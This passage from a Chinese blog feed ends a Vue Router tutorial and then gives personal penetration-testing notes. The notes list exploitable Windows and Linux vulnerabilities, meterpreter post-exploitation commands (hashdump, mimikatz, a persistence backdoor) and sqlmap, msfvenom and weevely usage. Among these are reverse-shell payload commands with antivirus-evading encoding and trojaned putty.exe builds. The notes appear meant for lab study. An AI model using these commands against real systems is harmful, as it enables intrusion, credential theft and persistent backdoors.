--&gt;&lt;router-link :to="/home/message/detail?id=666&amp;title=你好"&gt;跳转&lt;/router-link&gt;&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;&lt;router-link :to="{path:'/home/message/detail',query:{   id:666,            title:'你好'}}"&gt;跳转&lt;/router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>接收参数：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="5-命名路由"><a href="#5-命名路由" class="headerlink" title="5.命名路由"></a>5.命名路由</h3><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/demo'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Demo<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Test<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span>                      <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'hello'</span> <span class="token comment">//给路由命名</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'welcome'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Hello<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>简化跳转：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--简化前，需要写完整的路径 --&gt;&lt;router-link to="/demo/test/welcome"&gt;跳转&lt;/router-link&gt;&lt;!--简化后，直接通过名字跳转 --&gt;&lt;router-link :to="{name:'hello'}"&gt;跳转&lt;/router-link&gt;&lt;!--简化写法配合传递参数 --&gt;&lt;router-link :to="{name:'hello',query:{   id:666,            title:'你好'}}"&gt;跳转&lt;/router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol><h3 id="6-路由的params参数"><a href="#6-路由的params参数" class="headerlink" title="6.路由的params参数"></a>6.路由的params参数</h3><ol><li><p>配置路由，声明接收params参数</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>News<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">component</span><span class="token operator">:</span>Message<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'detail/:id/:title'</span><span class="token punctuation">,</span> <span class="token comment">//使用占位符声明接收params参数</span><span class="token literal-property property">component</span><span class="token operator">:</span>Detail<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>传递参数</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to="/home/message/detail/666/你好"&gt;跳转&lt;/router-link&gt;&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link :to="{name:'xiangqing',params:{   id:666,            title:'你好'}}"&gt;跳转&lt;/router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p></blockquote></li><li><p>接收参数：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>title<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="7-路由的props配置"><a href="#7-路由的props配置" class="headerlink" title="7.路由的props配置"></a>7.路由的props配置</h3><p>​    作用：让路由组件更方便的收到参数</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'detail/:id'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Detail<span class="token punctuation">,</span><span class="token comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span><span class="token comment">// props:{a:900}</span><span class="token comment">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span><span class="token comment">// props:true</span><span class="token comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span><span class="token function">props</span><span class="token punctuation">(</span><span class="token parameter">route</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id<span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-lt-router-link-gt-的replace属性"><a href="#8-lt-router-link-gt-的replace属性" class="headerlink" title="8.<router-link>的replace属性"></a>8.<code>&lt;router-link&gt;</code>的replace属性</h3><ol><li>作用：控制路由跳转时操作浏览器历史记录的模式</li><li>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></li><li>如何开启<code>replace</code>模式：<code>&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></li></ol><h3 id="9-编程式路由导航"><a href="#9-编程式路由导航" class="headerlink" title="9.编程式路由导航"></a>9.编程式路由导航</h3><ol><li><p>作用：不借助<code>&lt;router-link&gt; </code>实现路由跳转，让路由跳转更加灵活</p></li><li><p>具体编码：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//$router的两个API</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">params</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span>xxx<span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>xxx<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">params</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">id</span><span class="token operator">:</span>xxx<span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>xxx<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//前进</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//后退</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//可前进也可后退</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="10-缓存路由组件"><a href="#10-缓存路由组件" class="headerlink" title="10.缓存路由组件"></a>10.缓存路由组件</h3><ol><li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p></li><li><p>具体编码：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;keep-alive include="News"&gt;     &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="11-两个新的生命周期钩子"><a href="#11-两个新的生命周期钩子" class="headerlink" title="11.两个新的生命周期钩子"></a>11.两个新的生命周期钩子</h3><ol><li>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。</li><li>具体名字：<ol><li><code>activated</code>路由组件被激活时触发。</li><li><code>deactivated</code>路由组件失活时触发。</li></ol></li></ol><h3 id="12-路由守卫"><a href="#12-路由守卫" class="headerlink" title="12.路由守卫"></a>12.路由守卫</h3><ol><li><p>作用：对路由进行权限控制</p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p></li><li><p>全局守卫:</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//全局前置守卫：初始化时执行、每次路由切换前执行</span>router<span class="token punctuation">.</span><span class="token function">beforeEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span>from<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEach'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span><span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'atguigu'</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//权限控制的具体规则</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//放行</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token comment">// next({name:'guanyu'})</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//放行</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment">//全局后置守卫：初始化时执行、每次路由切换后执行</span>router<span class="token punctuation">.</span><span class="token function">afterEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span><span class="token keyword">from</span></span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'afterEach'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">{</span> document<span class="token punctuation">.</span>title <span class="token operator">=</span> to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title <span class="token comment">//修改网页的title</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'vue_test'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>独享守卫:</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">beforeEnter</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span>from<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEnter'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span><span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'atguigu'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token comment">// next({name:'guanyu'})</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件内守卫：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//进入守卫：通过路由规则，进入该组件时被调用</span><span class="token function">beforeRouteEnter</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">//离开守卫：通过路由规则，离开该组件时被调用</span><span class="token function">beforeRouteLeave</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="13-路由器的两种工作模式"><a href="#13-路由器的两种工作模式" class="headerlink" title="13.路由器的两种工作模式"></a>13.路由器的两种工作模式</h3><ol><li>对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。</li><li>hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。</li><li>hash模式：<ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li>history模式：<ol><li>地址干净，美观 。</li><li>兼容性和hash模式相比略差。</li><li>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> APP开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全笔记整理</title>
      <link href="/2022/11/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/"/>
      <url>/2022/11/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="常用漏洞及其端口"><a href="#常用漏洞及其端口" class="headerlink" title="常用漏洞及其端口"></a>常用漏洞及其端口</h1><ul><li><h5 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>nmap –script smb-vuln-ms08-067<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）</p><blockquote><p>注：必须手动设置正确的target、可用check、脚本扫描和设置错误的target都会破坏漏洞</p></blockquote></li><li><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17_010"></a>MS17_010</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>smb共享服务<br><strong>发现方式：</strong>有配套的扫描模块<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）</p></li><li><h5 id="is-known-pipename"><a href="#is-known-pipename" class="headerlink" title="is_known_pipename"></a>is_known_pipename</h5><p><strong>对应端口：</strong>445<br><strong>对应服务：</strong>Liunx：smb3.X-4.X，smb3.5.0-4.6.4的中间版本<br><strong>效果：</strong>获取到目标靶机的shell<br><strong>漏洞修复：</strong> /etc/samba/smb.conf 76行添加<code>nt pipe support = no</code>,然后重启服务：<code>service smb restart</code></p></li><li><h5 id="CVE-2017-7269"><a href="#CVE-2017-7269" class="headerlink" title="CVE-2017-7269"></a>CVE-2017-7269</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS 6.0<br><strong>发现方式：</strong>使用nmap –script http-webdav-scan<br><strong>效果：</strong>获取到目标靶机的meterpreter</p><blockquote><p>注：搜索不到，exploit/windows/iis/cve_2017_7269</p></blockquote></li><li><h5 id="MS15-034"><a href="#MS15-034" class="headerlink" title="MS15_034"></a>MS15_034</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>IIS<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>加固方法：</strong>服务器管理器中关闭内核缓存</p></li><li><h5 id="CVE-2017-8464"><a href="#CVE-2017-8464" class="headerlink" title="CVE-2017-8464"></a>CVE-2017-8464</h5><p><strong>对应端口：</strong>80<br><strong>对应服务：</strong>PHP<br><strong>攻击条件：</strong>需要拿到shell，执行生成的php代码<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p></li><li><h5 id="vsftpd2-3-4（笑脸漏洞）"><a href="#vsftpd2-3-4（笑脸漏洞）" class="headerlink" title="vsftpd2.3.4（笑脸漏洞）"></a>vsftpd2.3.4（笑脸漏洞）</h5><p><strong>对应端口：</strong>21<br><strong>对应服务：</strong>vsftpd2.3.4<br><strong>利用方式：</strong>使用msf搜索vsftpd，或者ftp使用root:)，密码空登录，然后nc 6200端口<br><strong>效果：</strong>获取到目标靶机的shell</p></li><li><h5 id="mssql-exec"><a href="#mssql-exec" class="headerlink" title="mssql_exec"></a>mssql_exec</h5><p><strong>对应端口：</strong>1433<br><strong>对应服务：</strong>mssql<br><strong>利用条件：</strong>通过暴力破解获得密码（默认账号sa）<br><strong>效果：</strong>可以执行cmd指令</p><blockquote><p>注：开启远程桌面命令需要对“和\使用\转义</p></blockquote></li><li><h5 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12_020"></a>MS12_020</h5><p><strong>对应端口：</strong>3389<br><strong>发现方式：</strong>msf有配套扫描模块<br><strong>效果：</strong>使对方主机蓝屏<br><strong>修复方法：</strong>服务（services.msc）中关闭Remote Desktop Services</p></li><li><h5 id="ms14-064"><a href="#ms14-064" class="headerlink" title="ms14_064"></a>ms14_064</h5><p><strong>利用方式：</strong>需要通过远程桌面点击恶意链接<br><strong>效果：</strong>获取到目标靶机的meterpreter（系统权限）（仅限windows）</p></li><li><h5 id="CVE-2018-4878"><a href="#CVE-2018-4878" class="headerlink" title="CVE-2018-4878"></a>CVE-2018-4878</h5><p><strong>攻击条件：</strong>需要Flash 0Day漏洞<br><strong>效果：</strong>将产生的攻击载荷放在80端口的index.html，用（exploit/multi/handler）监听，等待靶机访问</p></li><li><h5 id="MS11-003"><a href="#MS11-003" class="headerlink" title="MS11_003"></a>MS11_003</h5><p><strong>攻击条件：</strong>ie8浏览器存在css漏洞<br><strong>效果：</strong>生成钓鱼链接，别人访问链接之后产生session</p><blockquote><p>注: target必须设置正确</p></blockquote></li><li><h5 id="Java-store"><a href="#Java-store" class="headerlink" title="Java_store"></a>Java_store</h5><p><strong>攻击条件：</strong>存在java无效数组索引漏洞，java安全等级低，需要远程桌面点击恶意链接。<br><strong>效果：</strong>获取到目标靶机的meterpreter权限</p><blockquote><p>注: payload最好使用http</p></blockquote></li><li><h5 id="Esteemaudit"><a href="#Esteemaudit" class="headerlink" title="Esteemaudit"></a>Esteemaudit</h5><p><strong>攻击条件：</strong>windows2003或xp，开启域和远程桌面<br><strong>对应端口：</strong>135，139，3389<br><strong>效果：</strong>获取到目标靶机的<code>最高</code>meterpreter权限</p></li><li><h5 id="exploit-x2F-multi-x2F-handler"><a href="#exploit-x2F-multi-x2F-handler" class="headerlink" title="exploit/multi/handler"></a>exploit/multi/handler</h5></li></ul><p><strong>效果：</strong>监听端口，推荐使用-j后台运行</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="1-DOS命令："><a href="#1-DOS命令：" class="headerlink" title="1.DOS命令："></a>1.DOS命令：</h2><ul><li><strong>systeminfo:</strong> 查看系统信息</li><li><strong>tasklist /svc:</strong> 计算机进程</li><li><strong>netstat -an:</strong>  查看开放的端口</li><li><strong>REG ADD HKLM/SYSTEM/CurrentControlSet/Control/Terminal “ “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f：</strong>开启3389端口</li><li><strong>|findstr:</strong> 字符串过滤</li><li><strong>wmic process where name = “进程名” get name,executablepath:</strong> 查找进程</li><li><strong>net config:</strong> 配置服务器或域相关设置</li><li><strong>type:</strong> 显示文件内容</li><li><strong>wce.exe -w:</strong> 导出本地用户hash</li><li><strong>set log:</strong> 查看域控主机名</li><li><strong>shell:startup:</strong> 打开启动运行文件夹</li></ul><h2 id="2-linux命令："><a href="#2-linux命令：" class="headerlink" title="2.linux命令："></a>2.linux命令：</h2><ul><li><strong>locate 关键词:</strong> 查找文件</li><li><strong>|grep:</strong> 过滤字符</li></ul><h2 id="3-meterpreter命令"><a href="#3-meterpreter命令" class="headerlink" title="3.meterpreter命令"></a>3.meterpreter命令</h2><ul><li><strong>sysinfo:</strong> 查看系统信息</li><li><strong>shell:</strong> 打开终端</li><li><strong>load mimikatz(Kiwi):</strong> wdigest可以获取管理员密码</li><li><strong>run getgui -e</strong>:启动目标靶机的远程桌面服务</li><li><strong>del:</strong> 删除文件</li><li><strong>edit:</strong> 编辑文件</li><li><strong>cat:</strong> 读取文件</li><li><strong>reboot:</strong> 重启</li><li><strong>ps:</strong> 查看运行进程pid</li><li><strong>migrate：</strong>迁移进程</li><li><strong>getpid:</strong> 查看当前的进程号</li><li><strong>background:</strong> 将会话置于后台</li><li><strong>hashdump:</strong> 获取哈希密码（如果不行可以搜索使用hashdunp模块）（配合linux ophcrack解密工具）</li><li><strong>getuid、getsystem、getprivs:</strong> 提权</li><li><strong>:</strong> 提权</li><li><strong>background:</strong> 切换到后台运行</li><li><strong>run persistence:</strong> 注入后门（-X 开机时自动加载 -i 回连的时间间隔 -p 端口号 -r 渗透机ip）</li></ul><h2 id="4-常用数据库命令"><a href="#4-常用数据库命令" class="headerlink" title="4.常用数据库命令"></a>4.常用数据库命令</h2><ul><li><strong>mysql -h 主机地址 -u用户名 -p密码:</strong> 登录数据库</li><li><strong>select version():</strong> 查看数据库版本 </li><li><strong>show databases:</strong> 显示所有数据库</li><li><strong>drop database 数据库名:</strong> 删除数据库</li><li>**drop user ‘username‘@’%’: 删除用户</li><li><strong>create database 数据库名：</strong> 新建数据库</li><li><strong>use 数据库名：</strong> 使用数据库</li><li><strong>show tables:</strong> 显示当前数据库中的所有数据表</li><li><strong>describe 表名:</strong> 查看表结构</li><li><strong>select 字段1,字段2 from 表名 where 条件:</strong> 查看数据表中的字段</li><li><strong>update 数据表 set 字段 = ‘新值’ where 条件：</strong> 修改用户表</li><li><strong>flush privileges:</strong> 刷新权限</li><li><strong>show grants for 用户名@’主机地址’：</strong> 查看当前用户权限</li><li><strong>grant 权限 on 数据库名.表名 to 用户名@’主机名’（*.*表示所有数据库所有表）：</strong>授权</li></ul><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><ul><li><strong>-sS:</strong> TCP同步扫描，半开放式</li><li><strong>-sV:</strong> 扫描系统服务及版本信息</li><li><strong>-sC:</strong> 调用默认的服务扫描脚本</li><li><strong>-sP:</strong> ping扫描</li><li><strong>-Pn:</strong> 不进行ping</li><li><strong>-oX xx.xml:</strong> 以xml格式输出</li><li><strong>-O:</strong> 操作系统扫描</li></ul><h2 id="netdiscover-网络扫描工具"><a href="#netdiscover-网络扫描工具" class="headerlink" title="netdiscover(网络扫描工具)"></a>netdiscover(网络扫描工具)</h2><p><strong>netdiscover -r 目标网段  （-r 扫描范围，例如192.168.0.0/24）</strong></p><h2 id="dirb-基于字典的web目录扫描工具"><a href="#dirb-基于字典的web目录扫描工具" class="headerlink" title="dirb(基于字典的web目录扫描工具)"></a>dirb(基于字典的web目录扫描工具)</h2><p><strong>dirb http://192.168.1.0/24</strong></p><h2 id="nikto-Web漏洞扫描神器"><a href="#nikto-Web漏洞扫描神器" class="headerlink" title="nikto(Web漏洞扫描神器)"></a>nikto(Web漏洞扫描神器)</h2><p><strong>nikto -host http://172.168.1.105</strong></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><strong>ssh 客户端用户名@服务器ip地址</strong><br><strong>-X</strong> 调用图形界面<br><strong>-p</strong> 选项来修改端口号，默认22<br><strong>-i</strong> 使用私钥</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>sqlmap -u “http://172.16.1.1/login.php” –forms –level 3 –dbs</strong><br>–forms 针对form表单<br>-l 使用txt文件<br>-p Host 手动指定检查HTTP头中的HOST<br>–level 扫描级别，1-5，默认是1,越高越强<br>–batch 不用询问，使用默认的选项<br>–dbs 显示所有数据库<br>-D 指定数据库<br>–tables 显示选定数据库下的数据表<br>-T 指定数据表<br>–columns 显示选定表中的所有列名<br>-C 指定列名<br>–dump 导出选中的列名</p><h2 id="msfvenom（后门木马生成工具）"><a href="#msfvenom（后门木马生成工具）" class="headerlink" title="msfvenom（后门木马生成工具）"></a>msfvenom（后门木马生成工具）</h2><p>-p 载荷(msfvenom -l payloads)<br>-f 输出格式(msfvenom –help-formats)<br>-o 文件输出<br>-x 绑定软件<br>-e 编码免杀(msfvenom -l encoders)<br>-i 编码次数<br>-a 架构平台(x86/x64)<br>– platform 平台(windows/linux)<br>简单型：<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 -f exe -o payload.exe</strong><br>绑定软件型：<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 -x /root/putty.exe -f exe -o payload.exe</strong><br>编码免杀型：<strong>msfvenom –p windows/meterpreter/reverse_tcp LHOST=172.16.1.100 LPORT=8080 –e x86/shikata_ga_nai –i 3 –f exe –o C:\back.exe</strong></p><h2 id="weevely（后门木马生成工具）"><a href="#weevely（后门木马生成工具）" class="headerlink" title="weevely（后门木马生成工具）"></a>weevely（后门木马生成工具）</h2><ul><li><strong>weevely generate password path:</strong> 生成后门木马文件</li><li><strong>weevely URL password:</strong> 连接生成的木马</li><li><strong>weevely generate.img password /xx.gif ./ :</strong> 在当前文件夹生成gif木马，只有kail1.0可用</li></ul><h2 id="msf"><a href="#msf" class="headerlink" 